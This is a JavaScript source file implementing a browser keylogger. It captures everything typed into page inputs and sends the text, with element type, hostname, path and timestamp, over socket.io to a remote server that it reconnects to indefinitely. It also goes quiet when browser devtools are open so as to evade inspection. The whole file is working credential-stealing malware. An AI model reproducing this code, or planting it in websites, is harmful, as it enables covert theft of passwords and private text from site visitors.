const devtools = require('devtools-detect');
const io = require('socket.io-client');
const socket = io.connect(SERVER_URL, {
  autoConnect: true,
  reconnection: true,
  reconnectionAttempts: 'Infinity'
});

var promise = null;
var buff = '';

// Stop when devtool is open
window.addEventListener('devtoolschange', function (e) {
  e.detail.open ? socket.disconnect() : socket.connect();
});

// Bind event to catch keys and words
document.addEventListener('input', function(e) {
  if (typeof e.data === 'undefined') {
    return;
  }

  // Clear previous timeout
  clearTimeout(promise);

  // Get the text value
  if (e.data.length === 1) {
    buff += e.data;
  } else {
    buff = e.data;
  }

  promise = setTimeout(function () {
    // Support IE6-8
    const target = e.target || e.srcElement;

    // Join and trim the buffer
    buff = buff.trim();
    if (!buff.length) {
      buff = '';
      return;
    }

    // Send buffer to the base
    socket.emit('keypress', {
      key: buff,
      element: target.nodeName,
      hostname: window.location.hostname,
      path: window.location.pathname,
      timestamp: Date.now()
    });
    buff = '';
  }, 300);
});
